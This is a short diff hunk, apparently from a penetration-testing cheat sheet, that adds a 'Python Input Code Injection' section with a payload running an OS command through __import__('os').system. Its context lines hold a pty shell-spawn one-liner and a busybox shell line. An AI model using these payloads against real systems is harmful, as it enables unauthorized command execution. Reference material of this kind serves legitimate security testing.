@@ -380,6 +380,12 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 /bin/busybox sh
 ```
 
+### Python Input Code Injection
+
+```python
+__import__('os').system('id')
+```
+
 ## Local Enumeration & Privilege Escalation
 
 ### Binary Exploitation with ImmunityDebugger
